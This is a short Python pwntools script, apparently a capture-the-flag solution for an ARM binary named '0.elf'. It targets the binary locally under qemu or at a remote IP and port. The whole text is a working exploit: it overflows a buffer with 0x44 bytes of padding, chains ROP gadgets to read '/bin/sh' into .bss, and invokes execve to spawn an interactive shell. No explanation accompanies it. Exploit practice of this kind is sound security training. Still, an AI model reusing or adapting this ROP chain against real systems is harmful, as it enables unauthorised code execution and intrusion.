#!/usr/bin/env python
from pwn import *

if len(sys.argv) == 1:
    s = process('qemu-arm-static ./0.elf', shell=True)
else:
    s = remote('114.177.250.4', 7777)

elf = ELF('./0.elf')

pop_r3 = 0x10160
pop_r4_r10 = 0x10ce8
set_r0_r2 = 0x10cd0
pop_r7 = 0x1930c
syscall = 0x16038

payload = ''
payload += 'A' * 0x44
payload += p32(pop_r3) + p32(pop_r3)
payload += p32(pop_r4_r10)
payload += p64(0) + p32(0) + p32(elf.bss()) + p32(0x100) + p64(0)
payload += p32(set_r0_r2)
payload += p32(0)
payload += p32(pop_r7) + p32(3)
payload += p32(syscall)
payload += 'A' * 0x1c
payload += p32(pop_r3) + p32(pop_r3)
payload += p32(pop_r4_r10)
payload += p64(0) + p32(elf.bss()) + p64(0) * 2
payload += p32(set_r0_r2)
payload += p32(0)
payload += p32(pop_r7) + p32(0xb)
payload += p32(syscall)
s.sendline(payload)

time.sleep(0.1)
s.send('/bin/sh\0')
s.interactive()
